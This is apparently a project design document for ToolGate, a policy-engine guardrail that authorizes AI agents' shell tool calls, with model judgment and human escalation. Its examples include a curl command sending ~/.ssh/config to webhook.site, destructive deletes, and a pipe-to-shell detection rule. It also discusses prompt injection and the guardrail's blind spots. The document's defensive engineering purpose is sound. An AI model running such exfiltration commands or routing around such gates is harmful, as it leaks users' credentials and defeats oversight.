# ToolGate: a policy engine that decides, a model that perceives, a human who breaks the tie

ToolGate is a guardrail that authorizes an AI agent's tool calls before they run. Every call is put to
a policy engine. The calls the policy engine cannot decide are put to a judgment model, whose answers
come back as typed attributes on which the policy engine decides again. The calls that neither can
settle are paused for a human. Every decision is one line in a JSONL record.

The one-line version, which the project uses as its mantra:

> **Jev labels reality. Cedar decides what's permitted. Nothing decides twice.**
>
> Judgment model = perception. Policy engine = authority.

This document is about the design: what problem it solves, why it is shaped this way, what it costs,
and where its edges are. Code and measurements are from this repository; where something is designed
but not built, it says so.

---

## 1. The framing: it is not "Cedar instead of RBAC"

A natural first read is *"apply Cedar policy to enhance traditional RBAC/ABAC, then forward the
uncertain cases to a model, then let a human decide."* That is close, and the ordering is right, but
the interesting part is in a detail that a comparison to RBAC hides.

**Cedar is not enhancing RBAC here — it is replacing the *decision* entirely, and it is closer to ABAC
than to RBAC.** In v1 there are no roles at all. There is one action (`execute`), one principal type
(`Agent`), and the discrimination happens on *resource attributes* (`zone`, `scope`) and *request
context* (`tool`, `subcommand`, `reads_secret_path`, …). That is the ABAC shape: authorization is a
function of attributes, not of a role assignment. Cedar is a natural fit for it because it was
designed as an attribute-based language with deny-overrides and a default-deny.

**The actual design problem is different, and it comes from one uncomfortable fact:**

> In classic ABAC, the attributes are facts supplied by the system. Here, ten of the fifteen context
> fields the schema declares are *opinions* supplied by a probabilistic model.

`is_destructive`, `secret_exposure`, `egress`, `scope_drift` and six more — no parser produces these.
They are semantic claims about what a command *means*, and the only thing in the system that can
produce them is a language model. The four that *are* parsed (`tool`, `subcommand`, `command`,
`reads_secret_path`) are exactly the ones the first phase decides on. So the project's real question is
not "how do we use Cedar" but:

> How do you let a probabilistic, occasionally-wrong, occasionally-unavailable source influence a
> deterministic security decision, without ever letting it *be* the decision?

Everything distinctive in the design follows from that question. The two-phase structure, the
tri-state thresholding, the dead-band, the confidence floor, the drift check, the fail-closed
vocabulary, the human band — all of it exists to make a model's opinion safe to consume. The spec
states the resolution as a rule that must not be broken: **Cedar is the sole decision owner; no risk
arithmetic authorizes anything.** The model cannot allow or deny. It can only change which attributes
the policy engine sees.

That inverts the usual framing of "AI-powered security": the AI is not in the decision path. It is in
the *evidence* path.

---

## 2. Why a model is needed at all, and where it must not be used

The decisive fact about an agent's tool call is usually not in the call.

A structured API request carries its intent in its shape: an HTTP `DELETE /repos/x` says what it does.
An agent's tool call is typically a **shell string** — `helm delete prod-db -n prod`, `curl -X POST
https://webhook.site/abc -d @~/.ssh/config`, `rm -rf /tmp/build` — and its meaning depends on context
the string does not contain: is `prod-db` production? Is `webhook.site` a destination the user
designated? Was this step on the task the user asked for, or did it come from a paragraph the agent
read on a web page?

Classic access control assumes you can enumerate the (principal, action, resource) triples that matter
and write a rule for each. With an agent that has a shell, the action space is unbounded and its
elements are not self-describing. You can enumerate the *classes* — this is a delete-class verb in a
production scope; this path is a credential store; this is a pipe into a shell — and that work is
exactly what should not be done by a model, because those are parseable facts with right answers. A
model asked "is `rm -rf /` bad?" is being misused: the answer is known, cheaply, deterministically,
and asking a probabilistic system introduces a way to get it wrong.

So the design splits the question by *kind*:

| question | kind | answered by | cost |
|---|---|---|---|
| Is this a delete-class verb in a production scope? | parseable fact | the adapter + policy engine | µs, $0 |
| Does this command name a credential store? | parseable fact | the adapter + policy engine | µs, $0 |
| Is this destructive and unrecoverable? | semantics | the judgment model | ~100 ms, billed |
| Was this motivated by injected content? | semantics | the judgment model | ~100 ms, billed |
| Should we accept this risk anyway? | authority | a human | however long it takes |

and the two-phase structure is that table turned into a control flow.

---

## 3. The shape: two authorizations, three bands, one owner

```
agent ──► ToolGate (MCP gateway / SDK / CLI wrapper)
              │
              ▼
        the adapter: tool args → entities + context      (deterministic parsing only)
              │
              ▼
   ═══ AUTHORIZE #1 — gate policies (static facts) ══════════════════  ~1 ms, $0
        ├─ a forbid matched ──► BLOCK    (policy id recorded; the model is never called)
        ├─ a permit matched ──► ALLOW    (fast path; the model is never called)
        └─ nothing matched  ──► GRAY ─────────────┐
                                                  ▼
                        the battery — one call, all questions in parallel   ~275 ms, ~$0.00007
                                                  │
                                                  ▼
                        thresholding: dead-band + confidence gate
                                                  │  typed, tri-state attributes
                                                  ▼
   ═══ AUTHORIZE #2 — judgment policies (context enriched) ═══════════  ~1 ms, $0
        ├─ a forbid matched ──► BLOCK    (policy id recorded)
        ├─ a permit matched ──► ALLOW
        └─ nothing matched  ──► ESCALATE  ← default-deny is the third band, for free
```

Three things about this are worth isolating, because they are the parts that are not obvious.

**The three bands are not implemented.** Cedar authorizes a request if and only if at least one
permit matches *and* no forbid matches, with deny overriding permit. That evaluation has exactly
three possible outcomes, and they map onto the bands directly:

| Cedar's outcome | phase 1 | phase 2 |
|---|---|---|
| a `forbid` matched | **BLOCK** | **BLOCK** |
| a `permit` matched, no `forbid` | **ALLOW** | **ALLOW** |
| nothing matched (default-deny) | **GRAY** — hand off to judgment | **ESCALATE** — hand off to a human |

There is no band logic anywhere in the codebase. The bands *are* the policy engine's result. This
matters more than it looks: bespoke scoring logic is where authorization systems usually acquire their
bugs, because it is the one part nobody can review as a policy.

**Default-deny is repurposed as a hand-off signal, not a refusal.** In a conventional deployment,
"nothing matched" means "deny". Here, in phase 1 it means "this needs judgment" and in phase 2 it means
"this needs a human". The system's answer to uncertainty is to *route* it, not to guess — and the
third band (a human) is the product, not an error path.

**Deny-overrides gives monotonic tightening for free.** Adding a `forbid` to a policy set can only
ever remove authority; it cannot create it. A reviewer can add a prohibition without having to reason
about what it might accidentally permit, which is what makes "policies are files in git, and policy
review is code review" a workable adoption story.

---

## 4. Phase 1: facts no model should be asked

Phase 1 is a small, deliberately enumerated policy set over parsed facts. In this repository it is
four policies:

```cedar
// A path the adapter mapped into the secret zone is off-limits for ANY action, not just writes —
// despite the id. `context.reads_secret_path` is the adapter's other secret signal; it is
// deliberately NOT a phase-1 forbid, because a command that merely *references* a secret path
// (e.g. `curl -d @~/.ssh/config`) must stay GRAY and reach judgment, where `secret-egress-v1`
// judges the intent.
@id("secrets-never-writable-v1")
forbid (principal, action, resource)
when { resource.zone == "secret" };

// `drop` and `truncate` are here because SQL spells the same operation differently — the adapter
// reads a statement's leading verb into `context.subcommand` so this list can see it.
@id("prod-delete-class-v1")
forbid (principal, action, resource)
when { resource.scope == "production" && ["delete", "uninstall", "purge", "destroy",
                                         "drop", "truncate"].contains(context.subcommand) };

@id("read-only-repo-permit-v1")
permit (principal, action == toolgate::Action::"execute", resource in toolgate::Workspace::"repo")
when { ["ls", "cat", "git"].contains(context.tool)
    && ["status", "log", "diff"].contains(context.subcommand) };

@id("pipe-to-shell-v1")
forbid (principal, action, resource)
when { context.command like "* | sh*" || context.command like "* | bash*" };
```

Every policy carries a stable `@id`, and that id is what appears in the decision record and in the
"why" a human is shown. A security reviewer reads `["prod-delete-class-v1"]`, not a sentence written
by a model.

Two design decisions are visible in that file.

**Phase-1 permits are trust grants, and they are conservative.** A permitted call is never seen by the
model. `read-only-repo-permit-v1` covers `ls`/`cat`/`git` with `status`/`log`/`diff` — read-only,
boring, and the bulk of real traffic. Everything else in the gray middle pays for judgment. This is
also the main cost lever in the design: the higher the phase-1 hit rate, the smaller the bill.

**The adapter is load-bearing, and it is the silent failure mode.** Cedar cannot read a shell string;
it sees `resource.zone == "secret"`, which only exists because the adapter parsed a path and decided
it was a credential store. A wrong mapping does not error — it silently disables a policy. The spec
names this as risk #2 and requires two mitigations: policy sets are validated against the schema at
startup (the service refuses to boot on an invalid set), and the adapter's mapping is pinned by tests
that name real paths rather than restating the code's own declarations. The second mitigation is
weaker than it sounds, and the first case study in
[the defect record](defect-case-studies.md) is about a case where it failed.

---

## 5. Phase 2: perception, reduced to typed attributes

The gray middle goes to the judgment model — TypeSafe's Jev — as a **fixed battery of questions**,
asked in one call, in parallel. The battery is a declaration, not a prompt scattered through the
code: each question declares its id, its kind, the Cedar context attribute it feeds, its thresholds,
and (for the one choice question) its options. The wire payload and every derived view are computed
from that declaration, and a test pins the Cedar schema against it.

In gateway mode — the MCP proxy, which sees tool calls but not the conversation — the battery asks
**eight** questions. Two more (`intent_match`, `injected`) are declared for SDK mode, where the agent
can supply the user's intent, and are not asked here:

| question | kind | feeds | thresholds | critical |
|---|---|---|---|---|
| `destructive` | probability | `is_destructive` | 0.35 / 0.65 | **yes** |
| `blast_radius` | choice | `blast_radius` | min confidence 0.70 | — |
| `recoverable` | probability | `is_recoverable` | 0.35 / 0.65 | no |
| `secret_exposure` | probability | `secret_exposure` | 0.35 / 0.65 | **yes** |
| `egress` | probability | `egress` | 0.30 / 0.70 | no |
| `spends_money` | probability | `spends_money` | 0.30 / 0.70 | no |
| `scope_drift` | probability | `scope_drift` | 0.35 / 0.65 | no |
| `well_formed` | probability | `well_formed` | 0.35 / 0.65 | **yes** |
| `intent_match` | probability | `intent_match` | 0.35 / 0.65 | **yes** *(SDK)* |
| `injected` | probability | `injected` | 0.35 / 0.65 | **yes** *(SDK)* |

The state sent for judgment is the tool call and a context envelope. In the implementation that
envelope is largely placeholder — the tool, the raw arguments, a working directory, empty project
facts and recent actions, and `local` as the environment — with SDK mode's user intent being the field
that would carry the most weight if the deployment shape could supply it.

**The state is not scrubbed, and the spec says it must be.** The design requirement is explicit:
*"secrets scrubbed or hashed before leaving the machine — the gate must not become the leak."* The
implementation applies `scrub_command` to the decision record and `scrub_payload` to the trace, but
`_phase2` hands the raw `args` to the judgment client, which serialises `state` directly onto the
wire. A command carrying a credential — `curl … -d @~/.ssh/config`, `export API_KEY=…` — is therefore
transmitted in clear to the judgment model. The record redacts it and the wire does not. This is a
one-line gap and it is listed in section 13 rather than papered over here: a guardrail that leaks what
it is inspecting has failed at its own premise.

### The response contract is strict, on purpose

Every battery question must be present exactly once; probabilities must be numbers in range; the choice
answer must be one of the declared options. Anything else — a missing key, a truncated body, a
non-JSON reply — is `malformed`, and malformed is treated exactly like an outage: **escalate, never
silently allow.** The spec permits one bounded retry here; the implementation does not retry at all,
escalating on the first unreachable or off-contract response, which is the stricter of the two. The
strictness is the point: the gray middle must never become a "silently allowed middle" because a
response was half-written.

### Thresholding is where the model meets the policy engine

This is the load-bearing seam, and it is about twenty lines:

```python
def threshold(answers: dict) -> dict:
    """Map validated Jev answers to phase-2 context fields (tri-state + confidence floor)."""
    ctx: dict = {}
    breached = False
    for qid, cfg in THRESHOLDS.items():
        p = answers[qid]["noul"]
        if p >= cfg["high"]:
            val = True
        elif p <= cfg["low"]:
            val = False
        else:                       # the dead-band → undecided
            val = False             # represented as false...
            if cfg["critical"]:
                breached = True     # ...but a critical question raises the flag
        ctx[QUESTION_TO_CONTEXT[qid]] = val

    br = answers["blast_radius"]
    ctx["blast_radius"] = br["choice"]
    if br["confidence"] < BLAST_RADIUS_MIN_CONFIDENCE or br["choice"] == "unknown":
        breached = True

    ctx["confidence_floor"] = 1 if breached else 0
    return ctx
```

and the policy that consumes it is smaller still:

```cedar
@id("clean-call-permit-v1")
permit (principal, action, resource)
when {
  context.is_destructive != true &&
  context.secret_exposure != true &&
  context.spends_money != true &&
  context.well_formed == true &&
  context.confidence_floor == 0
};
```

Three mechanisms are packed into that pair.

**A dead-band, not a threshold.** A probability between `low` and `high` is not rounded to the nearer
side; it is *undecided*. A single cut-off would manufacture confidence the model does not have — a
0.51 would read the same as a 0.95.

**`confidence_floor` is how a tri-state becomes a two-valued policy language.** Cedar attributes here
are `Bool`, so "undecided" cannot be a third value. Instead, an undecided *critical* question sets
`confidence_floor: 1`, and the permit requires `confidence_floor == 0`. An undecided critical
attribute therefore makes the permit unsatisfiable, which — because nothing else permits — means
**ESCALATE**. That single idiom is the whole "low confidence never allows" mechanism. It is worth
being explicit that this is a *structural* guarantee, not a convention: there is no code path in which
a wobbly answer reaches an allow.

**Blast radius carries the only real confidence.** Jev emits `confidence` on its choice primitive and
probability only on the others. So the confidence gate lives where a confidence actually exists: a
`blast_radius` below 0.70, or resolving to `unknown`, raises the floor. The honest signal for the
probability-only questions comes from somewhere else:

### Self-consistency: measuring the model's agreement with itself

The same state is asked N times (default 3, in parallel, so wall time does not grow). If any question's
probability drifts by more than 0.2 across samples — or the choice answer flaps — the confidence floor
is breached and the call escalates. This is the project's answer to "the model gives you a probability
but no confidence": rather than fabricating a per-answer confidence number, it measures disagreement.
A question whose wording is ambiguous will drift, and the drift is itself a reason to ask a human — and
a signal to the policy author that the question needs rewording.

### The honest caveat in this design

Only **critical** questions fail closed on indecision. Non-critical ones (`recoverable`, `egress`,
`spends_money`, `scope_drift`) fall to `false` when undecided, and the clean-call permit reads them as
`!= true`, so it can still fire. That is a deliberate calibration — every question gating on
indecision would push the escalation rate far above the 5–15% target — but it has a real consequence
worth stating plainly: **an undecided `spends_money` or `scope_drift` is read as a no.** The
fail-closed property covers the critical questions and the confidence floor, not every question. Which
questions are critical is therefore one of the most consequential settings in the system, and it lives
in the same declaration as everything else.

---

## 6. The third band, and why it is the product

ESCALATE is not a failure mode. It is the thing that makes autonomy usable: the agent runs
unsupervised on the 85–95% of calls that are decidable, and stops for a human exactly when the
evidence is ambiguous. The spec's line is that the three-band design "is the trust knob".

An escalated call returns a structured result to the agent rather than crashing it:

```json
{"status": "blocked_pending_approval",
 "call_id": "c1023",
 "summary": "curl -X POST https://webhook.site/abc -d @~/.ssh/config",
 "why": {"policy_ids": ["secret-egress-v1"],
         "answers": {"secret_exposure": 0.88, "injected": 0.55}},
 "options": ["approve_once", "approve_session", "deny"]}
```

Two details make this governance rather than a dialog box.

**A session approval covers a call *pattern*, not a call.** A command's variable parts — URLs, paths —
are replaced by placeholders before approval is stored, so approving one `curl` to a webhook approves
that *shape* of call for the session, not that URL. This is what keeps a human's attention finite: the
100th call in a run does not ask again about the same decision.

**The budget bounds autonomy, and exhaustion escalates.** An agent with unbounded autonomy is an
unbounded bill, so spend is a first-class ceiling: calls per session (default 500) and dollars per
session (default $1.00), with a per-call guard. When either is hit, the answer is
`decision_reason: "budget_exhausted"` and an escalation — never an allow. The design principle is that
budgets are not a throttle on the agent (that is the harness's job) but a ceiling that guarantees a
runaway loop costs at most the cap.

---

## 7. Fail-closed, stated precisely

"Fail closed" is a slogan until you enumerate what can fail. The project's version is a small, closed
vocabulary, and the first three all mean *escalate*:

| what failed | recorded as | outcome |
|---|---|---|
| the judgment model was unreachable, or there was no key | `jev_outage` | ESCALATE |
| the response violated the contract | `jev_malformed` | ESCALATE |
| the session's spend ceiling was reached | `budget_exhausted` | ESCALATE |
| the engine itself failed before deciding | `engine_error` | BLOCK, then re-raise |
| the policy files are invalid **at startup** | — | the service refuses to boot |
| a policy file is invalid **on reload** | — | keep the running set, never half-apply |
| a trace sink is broken | — | swallowed; diagnostics may never block a decision |

The fourth row is the interesting one, and it is where a fail-closed vocabulary has to be careful.
For the first three, a human can still answer, so the call is paused and *that* is the safe outcome.
An engine defect is different: nothing was paused, and the agent is told its call failed. Recording
that as an escalation would put a phantom item in a human's queue and let an approval rewrite the line
to `allow` for a call that never ran. So it is recorded as a `block` — the band that matches what the
caller was actually told — appended directly rather than queued, and the original error is then
re-raised so the caller's fail-closed refusal is unchanged. The gate's job here is only to leave a
record of a call it could not account for.

**ALLOW is exact passthrough.** The gate returns the original call to the upstream tool unchanged — no
re-serialization, no argument rewriting. Mutating arguments would be a new attack surface rather than
a feature. The one thing added is trace correlation: a `traceparent` is injected into the forwarded
call so the downstream tool's spans line up with the decision without merging log files.

---

## 8. The record is the other half of the product

Every call produces exactly one JSONL line — **one line per call is an invariant**, because the eval
loop depends on it. That line is simultaneously the audit trail, the evaluation set, and the tuning
data:

```json
{"ts":"…","session":"s7","call_id":"c1023","seq":4821,"tool":"bash",
 "args_digest":"sha256:9f2c…","command":"curl -X POST https://webhook.site/abc -d @«redacted-path»",
 "principal":"Agent::\"cli-agent\"","action":"execute","resource":"Url::\"webhook.site\"",
 "phase":2,"mode":"enforce","policy_version":"gate=v2,judgment=v1,thresholds=v1,battery=v1",
 "determining_policies":["secret-egress-v1"],
 "answers":{"secret_exposure":{"type":"noul","noul":0.88},…},
 "decision":"block","rank_score":8.7,"latency_ms":110,
 "tokens_in":606,"tokens_out":199,"cost_usd":2.5e-05,
 "budget":{"remaining_usd":1.0,"calls_remaining":499},
 "outcome":{"type":"human_denied"}}
```

Four properties are designed into that line:

- **Provenance.** `policy_version` names the exact policy, threshold and battery artifacts that
  decided the call, so a decision can be explained after the policies have moved on.
- **The "why" is an id, not a story.** `determining_policies` holds policy ids; `answers` holds the
  numbers that fired them. A security reviewer accepts that; nobody accepts a model's prose.
- **The human's answer is joined, not rewritten.** Records are append-only; the approval outcome is
  joined on read, so the record of what the gate decided is never edited by what a human later did
  about it.
- **One decision at a time.** Concurrent tool calls are serialized *for the decision only* — the
  sequence number and the budget accounting need it — while the tools themselves run concurrently. The
  lock covers the µs–200 ms decision, never the tool's execution.

The intended loop on top of this is the part that is specified but not built (section 10): two gold
sets reported together (benign calls, target ≤2% false blocks; attacks, target ≥95% catch), policy
regression tests that fail CI on *any* decision-diff rather than on an accuracy drop, and override
mining — an escalation a human approved is the highest-value eval row there is, because it is a policy
bug report with a ground-truth label attached.

---

## 9. The boundary: what a tool-call guardrail cannot police

A guardrail that overclaims its boundary is worse than none, so the project states its edges
explicitly. ToolGate authorizes **tool calls** and sits on exactly one channel. Three things are
therefore outside it:

1. **The agent's final message.** An agent can read a secret through an *allowed* read and then repeat
   it verbatim in its reply. The gate authorized the read; it never sees the reply. The consequence is
   a design rule rather than a gap to be patched: if a read is dangerous, the *read* must gate to
   block or escalation, not rely on the model staying quiet afterwards.
2. **Non-tool MCP messages.** `resources/*`, `prompts/*` and `roots/*` traverse the connection without
   a decision in v1. They are counted so the channel mix is visible, but they carry no decision.
3. **The model's reasoning stream.** What the model thinks, or writes into its own context, is not
   observable by an external gate. The `injected` question is a *tripwire about* the reasoning, not a
   window into it.

The honest summary is that this is a tool-call authorization guardrail, not a content filter and not an
output filter — and that the model's own judgment is one input among several, never the authority.

---

## 10. What v1 implements, and what is still design

The spec is a v2 design document; the repository is an MVP. Being precise about the delta matters,
because several of the most appealing properties are specified and not yet built:

| Design element | Status |
|---|---|
| Two-phase authorization, three bands, policy ids in the record | **built** |
| Gate policies (4) and judgment policies (2, gateway mode) | **built** |
| The battery as a declaration, thresholding, dead-band, confidence floor, drift | **built** |
| Structured escalation, `approve_once` / `approve_session` / `deny`, call patterns | **built** |
| Session budget (calls + dollars), exhaustion → escalate | **built** |
| MCP gateway (gates `tools/call`; other channels pass through), CLI, live viewer | **built** |
| Decision record + boundary trace, scrubbing, append-only with join on read | **built** |
| `enforce` mode | **built** (the `mode` field is recorded) |
| `shadow` and `shadow-cheap` enforcement modes | **spec only** |
| Eval loop: gold sets, decision-diff CI, override mining (M5) | **spec only** |
| Per-repo `POLICY.cedar` merge; AVP adapter (M7) | **spec only** |
| Hot reload via a file watcher with atomic swap | **spec only** — the decide box rebuilds its engine per submission, which re-reads the policies, but nothing watches files |
| OTel-shaped span tree (`tool.call` → `gate.authorize` → `jev.invoke` → …) | **partly** — a boundary trace is emitted (`ingress`, `normalize`, `gate`, `judgment`, `verdict`) under different names |
| One bounded retry on an unreachable or malformed response | **spec only** — the implementation escalates on the first failure, which is stricter |
| Scrubbing the state sent to the judgment model | **spec only, and this one is a live gap** — the decision record and the trace are scrubbed; the wire is not |
| `intent_match`, `injected` in the battery | **declared, not asked** in gateway mode; SDK mode is v2 |

Two of those deserve emphasis. **`shadow` is the adoption story and it is not built** — the design is
that you install the gate, run a week of real traffic, and read what it *would* have blocked before it
has ever blocked a legitimate call. Without it, the first deployment is a leap of faith. And **the eval
loop is the mechanism that keeps the policy set honest**; without gold sets and decision-diffs, a
policy edit's blast radius is only as visible as its tests.

---

## 11. What the design demanded of the implementation

The design above is a set of claims: *the gate fails closed*; *the policy engine owns the decision*;
*the record accounts for every call*. Three defects found in review were each a place where the
implementation had quietly stopped honouring one of them, and all three had the same shape: **a
declaration that was still true where it was written and no longer true where it was enforced** — a
list, a port, a record.

They are kept as separate case studies, with the measurements and the mutation evidence, in
**[Three defects: when a declaration stops being true at the point of enforcement](defect-case-studies.md)**.
In one line each: the gate's credential-path list was shorter than the scrubber's, so three credential
stores were *allowed* while the record redacted them; the judgment client's default silently reached a
billed network API and seven tests were passing on real calls, because an outage and a real answer land
in the same band; and an unexpected engine failure recorded nothing at all, breaking the
one-line-per-call invariant exactly when it mattered most.

---

## 12. Verification

Current state of the repository, after the fixes described in the case studies:

| Check | Result |
|---|---|
| Test suite, with a judgment credential present | `245 passed` |
| Test suite, no credential | `243 passed, 2 skipped` |
| Diagram geometry checker | `PASS` |
| Live viewer — decide surface, local and public | `38/38` checks, both |
| Live viewer — read-only surface | `34/34` checks |
| Credential paths through the public decide surface | 5/5 blocked at phase 1 |
| Demo, keyless | `allowed 1  blocked 3  pending 1  approved 1  denied 1` |

The two tests skipped without a credential are the ones that exist to exercise the real wire. They make
real, billed calls when a key is present, which is why the suite reports its counts both ways.

What the two phases actually cost, measured over 59 calls recorded through the decide surface — 33
resolved at phase 1, 26 reaching phase 2, 23 of those really judged:

| | phase 1 | phase 2 |
|---|---|---|
| latency, median | **1.0 ms** | **275.2 ms** |
| latency, range | 0.8 – 23.6 ms | 236.9 – 329.5 ms |
| cost per call | **$0** | ~$0.000074 (~1,770 input tokens) |

Two things are worth reading off that table. The economics rest entirely on the phase-1 hit rate: a
call resolved by policy is free and deterministic, and a call that reaches judgment is neither. And
phase 2 is slower than the spec's 50–200 ms estimate — a median of 275 ms, p95 314 ms, against an SLO
of p95 < 400 ms. It meets the SLO, with less headroom than the design assumed. (The three phase-2
calls that never reached the model — all `jev_outage` — short-circuited in about 1 ms, which is the
outage path behaving as designed.)

## 13. Open, and deliberately deferred

- **The state sent to the judgment model is not scrubbed.** The spec requires it, the record and trace
  do it, and the wire does not — so a command's credentials reach the model in clear. Found while
  writing this document; not yet fixed.
- **The public demo viewer is unauthenticated.** Anyone who finds the hostname can submit commands,
  spend real credits and append to the decision log. It is behind a reverse proxy, which changes
  exposure rather than adding a control; basic auth is the obvious next step.
- **Agent identity is an open question in the spec** and unanswered in code: who mints an `Agent`
  entity, and how is its `trust` attribute attested?
- **Intent in gateway mode.** The MCP proxy sees tool calls but not the conversation, so the two
  questions whose absence most weakens phase 2 — `intent_match` and `injected` — are the two it cannot
  ask. That is a real limitation of the deployment shape, not of the design.
- **`Engine._build`'s twenty-key record shape is declared nowhere.** Four modules and the viewer's
  JavaScript read it by string key. It is the same class of duplication as the credential-path lists.
- **The trace vocabulary is bound by convention** across the engine, the viewer and the topology
  layout, so renaming a boundary silently shortens the drawn route.

---

*Glossary: the project's own vocabulary — the gate, the three bands, the gray middle, gate and
judgment policies, escalation, the battery, thresholding, blast radius, self-consistency, drift,
approval, call pattern, session, budget, policy version — is defined in
[CONTEXT.md](../CONTEXT.md). The full design, including the parts not yet built, is
[toolgate-spec.md](../toolgate-spec.md).*
